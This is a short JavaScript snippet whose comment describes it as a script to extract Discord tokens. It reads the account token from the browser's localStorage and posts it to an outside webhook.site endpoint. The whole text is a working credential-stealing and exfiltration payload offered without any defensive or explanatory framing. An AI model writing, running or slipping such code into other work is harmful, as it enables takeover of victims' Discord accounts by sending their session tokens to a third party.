//JS script to extract Discord tokens from localStorage.
const token = window.localStorage.getItem("token");
fetch("https://webhook.site/yourwebhook", {
  method: "POST",
  body: JSON.stringify({ token })
});
